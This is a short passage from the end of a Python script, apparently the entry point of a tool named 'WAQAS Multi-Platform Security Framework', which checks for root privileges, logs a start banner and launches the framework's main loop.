                handle_error(e, "Main Framework Loop")

# ==========================================
# MAIN ENTRY POINT
# ==========================================
def main():
    if os.geteuid() != 0:
        print(f"{Fore.RED}{Style.BRIGHT}[!] This tool requires root privileges!{Fore.WHITE}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[+] Run with: sudo python3 waqas_android_framework.py{Fore.WHITE}")
        sys.exit(1)

    logger.info("=" * 60)
    logger.info("WAQAS Multi-Platform Security Framework v4.0 started.")
    logger.info("=" * 60)

    framework = WaqasSecurityFramework()
    framework.run()

if __name__ == "__main__":
    main()